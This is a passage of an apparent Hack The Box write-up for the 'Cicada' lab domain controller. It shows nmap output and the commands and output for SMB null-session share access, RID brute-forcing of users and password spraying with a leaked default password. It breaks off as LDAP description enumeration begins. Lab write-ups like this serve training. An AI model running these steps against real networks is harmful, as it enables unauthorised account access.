---
layout: post
title:  "HTB: Cicada"
date:   2025-02-17
tags: htb smb-null-sessions password-spraying backup-operators sebackupprivilege sam-dump 
description: Cicada is a very easy active directory box that involves common AD enumeration to discover hardcoded credentials, which can be used to pivot to other users with more privileges. Eventually, we'll pivot to a user that is a member of the Backup Operators group, which we can abuse to dump hashes from the domain controller and get a shell as administrator through Pass-the-Hash.
image: "/assets/img/2025-02-17-htb-cicada/cicada-thumbnail.png"
---

## Overview

Cicada is a very easy active directory box that involves common AD enumeration to discover hardcoded credentials, which can be used to pivot to other users with more privileges. Eventually, we'll pivot to a user that is a member of the Backup Operators group, which we can abuse to dump hashes from the domain controller and get a shell as administrator through Pass-the-Hash.

## nmap

```
# Nmap 7.94SVN scan initiated Mon Feb 17 13:21:53 2025 as: nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985 -sSCV -vv -oN ciada.nmap 10.10.11.35
Nmap scan report for 10.10.11.35
Host is up, received echo-reply ttl 127 (0.047s latency).
Scanned at 2025-02-17 13:21:54 UTC for 87s

PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-02-17 20:04:55Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
| -----BEGIN CERTIFICATE-----
| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh
| MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy
| MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8
| BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua
| NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc
| Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x
| o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy
| 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC
| Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7
| Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp
| MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D
| QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j
| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
| dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB
| nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk
| YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
| YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi
| HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD
| ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE
| eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb
| xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz
| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT
| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF
| ji6zxYOoOznp6JlmbakLb1ZRLA8=
|_-----END CERTIFICATE-----
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
| -----BEGIN CERTIFICATE-----
| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh
| MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy
| MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8
| BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua
| NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc
| Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x
| o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy
| 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC
| Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7
| Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp
| MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D
| QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j
| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
| dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB
| nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk
| YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
| YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi
| HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD
| ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE
| eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb
| xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz
| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT
| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF
| ji6zxYOoOznp6JlmbakLb1ZRLA8=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
| -----BEGIN CERTIFICATE-----
| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh
| MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy
| MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8
| BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua
| NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc
| Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x
| o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy
| 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC
| Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7
| Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp
| MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D
| QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j
| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
| dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB
| nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk
| YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
| YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi
| HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD
| ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE
| eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb
| xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz
| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT
| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF
| ji6zxYOoOznp6JlmbakLb1ZRLA8=
|_-----END CERTIFICATE-----
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
| -----BEGIN CERTIFICATE-----
| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh
| MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy
| MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8
| BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua
| NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc
| Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x
| o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy
| 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC
| Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7
| Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp
| MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D
| QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j
| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
| dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB
| nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk
| YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
| YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi
| HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD
| ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE
| eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb
| xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz
| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT
| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF
| ji6zxYOoOznp6JlmbakLb1ZRLA8=
|_-----END CERTIFICATE-----
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-17T20:05:37
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h42m54s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 43674/tcp): CLEAN (Timeout)
|   Check 2 (port 62546/tcp): CLEAN (Timeout)
|   Check 3 (port 62917/udp): CLEAN (Timeout)
|   Check 4 (port 57183/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 17 13:23:21 2025 -- 1 IP address (1 host up) scanned in 87.99 seconds
```


Based on the nmap results, this is a domain controller with hostname `CICADA-DC` for `cicada.htb`.

## Service Enumeration

### SMB Null Sessions Enabled

Null sessions were enabled on the server.
The DEV and HR shares stand out, but we only have read access to the HR share with a null session.

```
$nxc smb 10.10.11.35 -u '%' -p '' --shares
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb%: (Guest)
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV                             
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON                        Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share
```

### Hardcoded Default Credentials in SMB Share (Unauthenticated)

A file was available in this share, and I downloaded it to my host.

```
$smbclient -N //10.10.11.35/HR
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 12:29:09 2024
  ..                                  D        0  Thu Mar 14 12:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 17:31:48 2024

                4168447 blocks of size 4096. 416544 blocks available
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (6.1 KiloBytes/sec) (average 6.1 KiloBytes/sec)
```

This file contained default credentials (`Cicada$M6Corpb*@Lp#nZp!8`) for onboarding new recruits to the company.

```
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

## Access as michael.wrightson

### Password Spraying with Discovered Credentials
To perform a password spray, we first needed a username wordlist.
Since we had access through null sessions, we can brute force RIDs to enumerate domain users.

```
nxc smb 10.10.11.35 -u 'guest' -p '' --rid-brute 3000                                                                                        [2879/3196]
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest:                                                                     
SMB         10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)                        
SMB         10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)                                                   
SMB         10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)                                                           
SMB         10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)                                                          
SMB         10.10.11.35     445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)                                                  
SMB         10.10.11.35     445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)                                                   
SMB         10.10.11.35     445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)                                                  
SMB         10.10.11.35     445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)                                               
SMB         10.10.11.35     445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)                                             
SMB         10.10.11.35     445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)                                                
SMB         10.10.11.35     445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)                                                  
SMB         10.10.11.35     445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)                                              
SMB         10.10.11.35     445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)                                    
SMB         10.10.11.35     445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)                                   
SMB         10.10.11.35     445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)                                   
SMB         10.10.11.35     445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)                                                
SMB         10.10.11.35     445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)                                                     
SMB         10.10.11.35     445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)                                          
SMB         10.10.11.35     445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)                                            
SMB         10.10.11.35     445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)                                        
SMB         10.10.11.35     445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)                                         
SMB         10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)                                                                     
SMB         10.10.11.35     445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)                                                                     
SMB         10.10.11.35     445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)                                                                
SMB         10.10.11.35     445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)                                                                        
SMB         10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)                                                                  
SMB         10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)                                                                 
SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)                                                              
SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)                                                                 
SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)                                                                   
SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

We can clean up the output to build the wordlist.

```
$cat users.txt | grep SidTypeUser | awk '{print $6}' | cut -d'\' -f2 > users.list
```

The password spray gave us a hit on `michael.wrightson`.

```
$nxc smb 10.10.11.35 -u users.list -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success                                                                                    
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE                                
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE                               
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8                                                 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE                               
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
```

## Access as david.orelious

### Discovering Credentials by Enumerating User Descriptions

Now that we have a valid domain user, we can enumerate LDAP.
An easy win is to enumerate user descriptions for hardcoded credentials, which could have been set by an administrator.

I used the `get-desc-users` module from `nxc` to enumerate user descriptions, and discovered hardcoded credentials (`aRt$Lp#7t*VQ!3`) for `david.orelious`.

```
$nxc ldap 10.10.11.35 -u michael.wrightson -p creds.txt -M get-desc-users                                                                                
